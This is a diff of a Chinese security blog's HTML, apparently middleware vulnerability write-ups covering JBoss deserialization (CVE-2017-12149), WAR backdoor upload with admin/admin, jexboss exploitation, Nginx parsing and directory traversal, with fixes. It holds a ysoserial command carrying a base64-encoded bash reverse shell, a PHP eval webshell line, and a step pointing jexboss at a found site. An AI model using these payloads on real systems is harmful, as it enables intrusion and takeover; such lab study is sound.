@@ -354,27 +354,36 @@
         
           
             <h2 id="jBoss中间件漏洞复现"><a href="#jBoss中间件漏洞复现" class="headerlink" title="jBoss中间件漏洞复现"></a>jBoss中间件漏洞复现</h2><h4 id="jBoss简介"><a href="#jBoss简介" class="headerlink" title="jBoss简介"></a>jBoss简介</h4><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
-<h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p>
-<p><strong>2、 漏洞复现</strong></p>
-<p>靶机启动jboss。</p>
-<p>攻击机访问靶机服务：</p>
-<p><a href="https://image.3001.net/images/20181216/1544955201_5c16254132af8.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955201_5c16254132af8.png!small" alt="img"></a></p>
-<p>访问/invoker/readonly。</p>
-<p>返回500，说明页面存在，此页面有反序列化漏洞：</p>
-<p><a href="https://image.3001.net/images/20181216/1544955212_5c16254c54a5e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955212_5c16254c54a5e.png!small" alt="img"></a></p>
-<p>抓包：</p>
-<p><a href="https://image.3001.net/images/20181216/1544955225_5c162559c837c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955225_5c162559c837c.png!small" alt="img"></a></p>
-<p>改包。</p>
-<p>POST payload.bin中数据。</p>
-<p><a href="https://image.3001.net/images/20181216/1544955253_5c162575ce0a6.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955253_5c162575ce0a6.png!small" alt="img"></a></p>
-<p><a href="https://image.3001.net/images/20181216/1544955240_5c162568b8024.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955240_5c162568b8024.png!small" alt="img"></a></p>
-<p>查看靶机，弹出计算器。</p>
-<p><a href="https://image.3001.net/images/20181216/1544955250_5c1625722d41e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955250_5c1625722d41e.png!small" alt="img"></a></p>
-<p><strong>3、 漏洞修复</strong></p>
-<p>有效解决方案：升级到JBOSS AS7版本临时解决方案：</p>
+<h4 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</h4><p>这里直接复制了官方文档复现：<a href="https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149</a></p>
+<p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg</a></li>
+<li><a href="https://access.redhat.com/security/cve/cve-2017-12149" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2017-12149</a></li>
+</ul>
+<h5 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h5><p>运行测试环境</p>
+<pre><code>docker-compose up -d</code></pre><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到JBoss默认页面。</p>
+<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化：</p>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/1.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/1.png" alt="img"></a></p>
+<p>所以，我们用常规Java反序列化漏洞测试方法来复现该漏洞。</p>
+<p><strong>编写反弹shell的命令</strong></p>
+<p>我们使用bash来反弹shell，但由于<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，我们需要用进行一次编码。</p>
+<p>工具：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/2.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/2.png" alt="img"></a></p>
+<p><strong>序列化数据生成</strong></p>
+<p>使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：</p>
+<pre><code>java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx}|{base64,-d}|{bash,-i}&quot; &gt; poc.ser</code></pre><p><strong>发送POC</strong></p>
+<p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可：</p>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/3.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/3.png" alt="img"></a></p>
+<p>成功反弹shell：</p>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/4.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/4.png" alt="img"></a></p>
+<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p>网上已经有很多EXP了，比如<a href="https://cdn.vulhub.org/deserialization/DeserializeExploit.jar" target="_blank" rel="noopener">DeserializeExploit.jar</a></p>
+<h5 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3 漏洞修复"></a>3 漏洞修复</h5><p>有效解决方案：升级到JBOSS AS7版本临时解决方案：</p>
 <p>1）不需要http-invoker.sar 组件的用户可直接删除此组件；</p>
 <p>2）用于对 httpinvoker 组件进行访问控制。</p>
-<h4 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h4><h5 id="1-漏洞原理-1"><a href="#1-漏洞原理-1" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。</p>
+<h4 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。</p>
+<p><strong>弱口令/未授权访问：</strong></p>
+<p>admin/admin</p>
 <p><strong>2、 漏洞复现</strong></p>
 <p><a href="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png!small" alt="img"></a></p>
 <p><a href="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png!small" alt="img"></a></p>
@@ -390,6 +399,223 @@
 <p>可进行文件管理和系统命令执行。</p>
 <p><a href="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png!small" alt="img"></a></p>
 <p><a href="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png!small" alt="img"></a></p>
+<h3 id="使用kali复现"><a href="#使用kali复现" class="headerlink" title="使用kali复现"></a>使用kali复现</h3><p>参考链接：<a href="https://blog.csdn.net/u011215939/article/details/79141624" target="_blank" rel="noopener">https://blog.csdn.net/u011215939/article/details/79141624</a></p>
+<p>所需工具：kallinux，jexboss，</p>
+<p>获取工具：打开kalilinux，在kali终端中输入以下命令：</p>
+<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTA4OTMxLTc1MzA2MTk4My5wbmc=.jpg" alt="img"></p>
+<p>下载完成</p>
+<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTAzNTExLTEwNzkzNTY3MDgucG5n.jpg" alt="img"></p>
+<p>运行 python jexboss.py</p>
+<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTQ5MzQ5LTE3NjgzMDY3ODYucG5n.jpg" alt="img"></p>
+<p>检验是否能够执行，可以执行就是如下：</p>
+<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTU5OTYwLTE2OTMyNzM0OTEucG5n.jpg" alt="img"></p>
+<p>找一个jboos的网站，如图所示</p>
+<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjA2Mjg0LTE1MzU0ODQxNTQucG5n.jpg" alt="img"></p>
+<p>将这个IP:8080复制到kalilinux中使用jexboss工具进行检测；</p>
+<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjQxMzA5LTE5MDI1MDExMzQucG5n.jpg" alt="img"></p>
+<p>执行,工具会依次检测一下项目，有漏洞就会显示红色的：VULNERABLE(易受攻击的)，工具就会根据找到容易受到攻击的点，进行利用</p>
+<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjQ5Njg0LTExNTA3Njc2MTcucG5n.jpg" alt="img"></p>
+<p>然后选择yes，开始创建连接；</p>
+<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjU3MTAwLTc0Nzg5ODU1Ni5wbmc=.jpg" alt="img"></p>
+<p>返回信息显示连接成功了；</p>
+<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzA0NzI2LTQ5ODI4NTQ5My5wbmc=.jpg" alt="img"></p>
+<p>现在获取了shell，开始执行shell命令了；返回的信息显示，这是一个linux操作系统；</p>
+<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzEzMzI0LTIwNzE4NzEyOTgucG5n.jpg" alt="img"></p>
+<p>执行几条命令看看； root权限</p>
+<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzIxMzA2LTUzNzY3MDMxMy5wbmc=.jpg" alt="img"></p>
+<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://www.bbsmax.com/A/WpdK3MwrdV/" target="_blank" rel="noopener">https://www.bbsmax.com/A/WpdK3MwrdV/</a></p>
+<p><a href="https://www.bbsmax.com/A/WpdK3MwrdV/" target="_blank" rel="noopener">https://www.bbsmax.com/A/WpdK3MwrdV/</a></p>
+<p><a href="https://www.freebuf.com/articles/web/192063.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192063.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/nginx-zhong-jian-jian-lou-dong/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/03/nginx-zhong-jian-jian-lou-dong/" itemprop="url">nginx中间件漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T10:37:22+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index">
+                    <span itemprop="name">中间件漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Nginx-系列漏洞复现"><a href="#Nginx-系列漏洞复现" class="headerlink" title="Nginx -系列漏洞复现"></a><strong>Nginx -系列漏洞复现</strong></h2><p>IIS是微软开发的web服务器，需要收费，主要用来跑asp.net asp php，只能在windows下运行。</p>
+<p>Apache是Apache基金会的web服务器，免费，只支持静态界面，是html容器，应用范围广泛。</p>
+<p>Tomcat是Apache基金会的java服务器，主要用来跑jsp php python等</p>
+<p>Ngnix是反向代理服务器，它是代理，本身并不执行，是个传话筒，把用户提交的请求转发给web服务器，再把web服务器的结果转发给用户。为了提高性能，启用反向代理，实际的web服务器可以有很多台，而Ngnix放在前面，可以把这些web服务器整合成一个虚拟的更强大的服务</p>
+<h4 id="Nginx-文件解析漏洞"><a href="#Nginx-文件解析漏洞" class="headerlink" title="Nginx-文件解析漏洞"></a>Nginx-文件解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​          nginx是一款高性能的web服务器，使用非常广泛，其不仅经常被用作反向代理，也可以非常好的支持PHP的运行。80sec发现其中存在一个较为严重的安全问题，默认情况下可能导致服务器错误的将任何类型的文件以PHP的方式进行解析，这将导致严重的安全问题，使得恶意的攻击者可能攻陷支持php的nginx服务器。<br>​          漏洞格式：test.jpg/a.php</p>
+<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先打开phpstudy切换版本为nginx-5.2.17</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131115008.png" alt=""></p>
+<p>我们可以从phpstudy下的nginx的index.html复制到网站根目录下</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131115049.png" alt=""></p>
+<p>我们从本地打开网站的该页面即可看到nginx的欢迎页面</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131115112.png" alt=""></p>
+<p>我们在C盘根目录下新建shell.php写入如下代码。然后任意选择一张图片。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131115532.png" alt=""></p>
+<p>我们在命令行下选择使用管理员打开命令行，然后使用copy命令制作图片马。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131120017.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131120033.png" alt=""></p>
+<p>然后我们在本地网站根目录下创建文件上传页面。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131121704.png" alt=""></p>
+<img src="QQ截图20200131121729.png" style="zoom:50%;" />
+
+<img src="QQ截图20200131121803.png" style="zoom:50%;" />
+
+
+
+
+
+
+
+<p>我们将我们刚刚制作好的图片马进行上传，发现提示上传成功。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131122629.png" alt=""></p>
+<p>我们在本地网站根目录下进行查看</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131122944.png" alt=""></p>
+<img src="QQ截图20200131123013.png" style="zoom:67%;" />
+
+
+
+<p>我们在shell.jpg后添加/a.php或/b.php后发现可以成功解析。</p>
+<img src="QQ截图20200131123036.png" style="zoom:67%;" />
+
+<h5 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p> 将php.ini文件中的cgi.fix_pathinfo的值设为0，这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404.</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131123518.png" alt=""></p>
+<h4 id="nginx-目录遍历漏洞"><a href="#nginx-目录遍历漏洞" class="headerlink" title="nginx-目录遍历漏洞"></a>nginx-目录遍历漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞。使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以是web根目录以外的文件），甚至执行系统命令。</p>
+<p>​      程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p>
+<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先需要将nginx的配置文件nginx.conf中autoindex off；改为on;</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131182922.png" alt=""></p>
+<p>我们任意访问网站根目录下的某一文件夹，即可看到该目录下的所有文件，出现目录遍历漏洞。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131183226.png" alt=""></p>
+<h5 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p>将nginx的配置文件nginx.conf下改为autoindex   off即可；</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200131182922.png" alt=""></p>
 
           
         
@@ -531,8 +757,7 @@
       
         
           
-            <h2 id="IIS中间件漏洞复现"><a href="#IIS中间件漏洞复现" class="headerlink" title="IIS中间件漏洞复现"></a>IIS中间件漏洞复现</h2><p>[TOC]</p>
-<h4 id="IIS-put漏洞"><a href="#IIS-put漏洞" class="headerlink" title="IIS-put漏洞"></a>IIS-put漏洞</h4><p><strong>什么是IIS？</strong></p>
+            <h2 id="IIS中间件漏洞复现"><a href="#IIS中间件漏洞复现" class="headerlink" title="IIS中间件漏洞复现"></a>IIS中间件漏洞复现</h2><h4 id="IIS-put漏洞"><a href="#IIS-put漏洞" class="headerlink" title="IIS-put漏洞"></a>IIS-put漏洞</h4><p><strong>什么是IIS？</strong></p>
 <p>  IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
 <h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​      WebDAV （Web-based Distributed Authoring and Versioning） 是一种HTTP1.1的扩展协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。可以像在操作本地文件夹一样操作服务器上的文件夹，该扩展也存在缺陷，可以被恶意攻击者利用，直接上传恶意文件。</p>
 <h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>1.准备过程：</p>
@@ -776,9 +1001,9 @@
 <li>manual—-手册</li>
 </ul>
 <h5 id="apache原理介绍"><a href="#apache原理介绍" class="headerlink" title="apache原理介绍:"></a>apache原理介绍:</h5><p>要讲到的Apahce的漏洞必须要理解Apache的运行原理。</p>
-<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CMusic%5Cv2-61e13c6df766e990c4e228d3222fee36_720w.jpg" alt=""></p>
+<p><img src="v2-61e13c6df766e990c4e228d3222fee36_720w.jpg" alt=""></p>
 <p>图中简易描述了Apahce与PHP配合完成了一次WEB请求，Apahce在前，PHP在后，那两者之间如何进行通信的呢？先了解下PHP的架构。如下图</p>
-<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CMusic%5Cv2-7692da2f8367d3fff6ef09df67fba07a_720w.jpg" alt=""></p>
+<p><img src="v2-7692da2f8367d3fff6ef09df67fba07a_720w.jpg" alt=""></p>
 <ul>
 <li>Zend Engine是PHP的底层实现，包含编译和执行，底层由C语言实现。</li>
 <li>Zend API、Zend Extension API是基于Zend底层对外封装提供服务。</li>
@@ -1044,7 +1269,7 @@ echo '<?php @eval($_POST[margin]);?>' > shell.php</code></pre>
       
         
           
-            <h2 id="XXE漏洞学习笔记-靶场实战"><a href="#XXE漏洞学习笔记-靶场实战" class="headerlink" title="XXE漏洞学习笔记+靶场实战"></a>XXE漏洞学习笔记+靶场实战</h2><p>[TOC]</p>
+            <h2 id="XXE漏洞学习笔记-靶场实战"><a href="#XXE漏洞学习笔记-靶场实战" class="headerlink" title="XXE漏洞学习笔记+靶场实战"></a>XXE漏洞学习笔记+靶场实战</h2><p>这里推荐一篇全面介绍XXE漏洞的文章：<a href="https://xz.aliyun.com/t/3357#toc-23" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-23</a></p>
 <h4 id="一、关于XML和XXE的基础知识"><a href="#一、关于XML和XXE的基础知识" class="headerlink" title="一、关于XML和XXE的基础知识"></a>一、关于XML和XXE的基础知识</h4><p>​     XXE全称XML,也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。要想搞懂XXE，一定要先了解XML语法规则和外部实体的定义及调用形式。</p>
 <h5 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h5><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素。XML语法规则：</p>
 <p>1.所有的XML元素都必须有一个关闭标签；</p>
@@ -3196,333 +3421,6 @@ cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/linux-an-zhuang/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/12/linux-an-zhuang/" itemprop="url">kali linux安装相关知识</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T21:09:50+08:00">
-                2020-03-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="kali-linux安装部分相关知识"><a href="#kali-linux安装部分相关知识" class="headerlink" title="kali linux安装部分相关知识"></a>kali linux安装部分相关知识</h3><h4 id="kali安装"><a href="#kali安装" class="headerlink" title="kali安装"></a>kali安装</h4><h5 id="硬盘安装"><a href="#硬盘安装" class="headerlink" title="硬盘安装"></a>硬盘安装</h5><ul>
-<li><p>下载安装镜像</p>
-<p><a href="https://www.kali.org/downloads" target="_blank" rel="noopener">https://www.kali.org/downloads</a></p>
-</li>
-<li><p>验证hash值</p>
-</li>
-<li><p>制作启动光盘</p>
-<p>live</p>
-</li>
-<li><p>制作启动U盘</p>
-</li>
-<li><p>设置BIOS启动顺序</p>
-</li>
-<li><p>启动安装</p>
-</li>
-</ul>
-<h5 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h5><ul>
-<li>虚拟化和Docker</li>
-<li>kali Docker image<ul>
-<li><a href="https://www.kali.org/news/official-kali-linux-docker-images/" target="_blank" rel="noopener">https://www.kali.org/news/official-kali-linux-docker-images/</a></li>
-<li><a href="https://github.com/offensive-security/kali-linux-docker" target="_blank" rel="noopener">https://github.com/offensive-security/kali-linux-docker</a></li>
-</ul>
-</li>
-</ul>
-<h5 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h5><ul>
-<li>官方VM镜像</li>
-<li>vmware workstation</li>
-<li>virtualBox<ul>
-<li>下载、安装、扩展工具、基本使用</li>
-<li>win8系统</li>
-<li>安装kali</li>
-<li>安装tools</li>
-</ul>
-</li>
-</ul>
-<h4 id="熟悉环境"><a href="#熟悉环境" class="headerlink" title="熟悉环境"></a>熟悉环境</h4><ul>
-<li>登录密码</li>
-<li>TOP 10安全工具</li>
-<li>字体调整</li>
-<li>强行终止程序</li>
-<li>文件目录</li>
-<li>共享文件</li>
-</ul>
-<h4 id="常见linux命令"><a href="#常见linux命令" class="headerlink" title="常见linux命令"></a>常见linux命令</h4><p>*<em>chmod *</em>控制文件如何被他人所调用</p>
-<ul>
-<li><p>​    u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</p>
-</li>
-<li><p>+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。</p>
-</li>
-<li><p>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。</p>
-<p>数字来表示权限</p>
-</li>
-</ul>
-<p>​    r=4,w=2,x=1</p>
-<ul>
-<li>若要rwx属性则4+2+1=7；</li>
-<li>若要rw-属性则4+2=6；</li>
-<li>若要r-x属性则4+1=5。<ul>
-<li>​    chmod ugo+r test.txt ，chmod a+r file1.txt  #将文件设为所有人皆可读取</li>
-<li>chmod 777 test.txt  #用数字来表示权限</li>
-</ul>
-</li>
-</ul>
